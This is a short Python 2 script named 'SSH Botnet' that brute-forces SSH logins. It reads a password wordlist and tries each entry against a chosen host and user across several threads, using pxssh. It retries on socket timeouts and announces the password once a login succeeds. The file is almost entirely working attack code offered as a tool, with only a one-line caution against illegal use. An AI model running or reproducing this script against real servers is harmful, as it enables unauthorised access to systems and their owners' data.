#!./env/bin/python

""" SSH Botnet

    Don't be a moron, please don't use this for something illegal.

    Usage:
        ssh_botnet.py
        ssh_botnet.py [<host> <user> <password>]
        ssh_botnet.py (-h | --help)

    Options:
        --host          remote hostname
        --user          remote username
        --password      password file path
        -h --help       Show this screen.
        --version       Show version
"""

import pxssh
import time
from docopt import docopt
from threading import Thread, BoundedSemaphore
from utilities import escape_color


maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before


def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print escape_color('[+] Password Found: ' + password, "green", False)
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main(arguments):
    if not arguments['<host>']:
        host = raw_input("hostname: ")
    else:
        host = arguments['<host>']

    if not arguments['<user>']:
        user = raw_input("user: ")
    else:
        user = arguments['<user>']

    if not arguments['<password>']:
        passwdFile = raw_input("Password File: ")
    else:
        passwdFile = arguments['<password>']

    if host is None or passwdFile is None or user is None:
        print __doc__
        exit(0)

    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print escape_color("[*] Exiting: Password Found", "green", False)
            exit(0)
        if Fails > 5:
            print escape_color("[!] Exiting: Too Many Socket Timeouts", "red", False)
            exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing: " + str(password)

        t = Thread(target=connect, args=(host, user, password, True))
        t.start()

if __name__ == '__main__':
    arguments = docopt(__doc__)
    main(arguments)
